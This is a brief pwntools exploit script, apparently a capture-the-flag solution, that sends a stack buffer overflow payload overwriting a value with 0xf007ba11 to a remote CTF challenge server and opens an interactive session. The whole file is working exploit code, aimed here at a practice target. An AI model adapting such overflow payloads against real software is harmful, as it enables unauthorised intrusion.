#!/usr/bin/env python2
#encoding: utf-8

from pwn import *

context.log_level = 'debug'

binary = './pwn1'

io = remote('pwn.ctf.tamu.edu', 4321)
#io = process(binary)

#gdb.attach(io, '''
#	b *0x0804861D
#''')

payload = 'A'*0x17 + pack(0xf007ba11)
io.recvuntil('What is my secret?\n')
io.sendline(payload)
io.interactive()




